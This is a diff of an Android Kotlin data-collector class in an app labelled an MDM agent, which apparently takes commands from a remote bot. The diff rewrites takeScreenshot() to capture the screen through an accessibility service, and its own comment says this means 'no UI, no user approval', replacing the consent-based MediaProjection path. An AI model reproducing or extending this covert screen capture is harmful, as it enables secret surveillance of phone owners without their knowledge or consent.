@@ -458,34 +458,42 @@ class DataCollectors(private val context: Context) {
     }
 
     fun takeScreenshot(): Any {
-        // Check if ScreenCaptureService is ready with MediaProjection
-        if (!ScreenCaptureService.isReady()) {
-            // ✅ Don't request permission from background - it fails on Android 12+
-            // User must send 'screenshot-on' command first to grant one-time permission
-            return errorJson("permission_needed",
-                "⚠️ يجب تفعيل لقطات الشاشة أولاً - أرسل أمر 'screenshot-on' من البوت ومنح الإذن على الهاتف")
-        }
+        Log.i(TAG, "📸 takeScreenshot called")
 
-        // Use MediaProjection to capture real screen
-        return try {
-            val latch = java.util.concurrent.CountDownLatch(1)
-            var resultFile: File? = null
-
-            ScreenCaptureService.requestScreenshot(context) { file ->
-                resultFile = file
-                latch.countDown()
+        // ✅ NEW: Use AccessibilityService.takeScreenshot() (Android 11+)
+        // No MediaProjection needed, no UI, no user approval
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!com.mdm.agent.service.MDMAccessibilityService.isAccessibilityScreenshotSupported()) {
+                return errorJson("error",
+                    "⚠️ خدمة إمكانية الوصول غير مفعّلة - فعّلها من إعدادات الأندرويد")
             }
 
-            // Wait up to 5 seconds for screenshot
-            latch.await(5, java.util.concurrent.TimeUnit.SECONDS)
+            return try {
+                val latch = java.util.concurrent.CountDownLatch(1)
+                var resultFile: File? = null
 
-            if (resultFile != null && resultFile!!.exists()) {
-                CollectedData.FileResult(resultFile!!, "screenshot")
-            } else {
-                errorJson("error", "فشل التقاط الصورة - حاول مرة أخرى")
+                com.mdm.agent.service.MDMAccessibilityService.takeScreenshotAccessibility { file ->
+                    resultFile = file
+                    latch.countDown()
+                }
+
+                // Wait up to 8 seconds for the screenshot
+                latch.await(8, java.util.concurrent.TimeUnit.SECONDS)
+
+                if (resultFile != null && resultFile!!.exists()) {
+                    Log.i(TAG, "✅ Screenshot captured via Accessibility: ${resultFile!!.absolutePath}")
+                    CollectedData.FileResult(resultFile!!, "screenshot")
+                } else {
+                    errorJson("error", "فشل التقاط الصورة عبر AccessibilityService")
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "❌ takeScreenshot exception: ${e.message}", e)
+                errorJson("error", "خطأ في لقطة الشاشة: ${e.message}")
             }
-        } catch (e: Exception) {
-            errorJson("error", "خطأ في لقطة الشاشة: ${e.message}")
+        } else {
+            // Android 10 and below - not supported by this approach
+            return errorJson("unsupported",
+                "⚠️ لقطات الشاشة تتطلب أندرويد 11 أو أحدث (الجهاز الحالي: Android ${Build.VERSION.SDK_INT})")
         }
     }
 
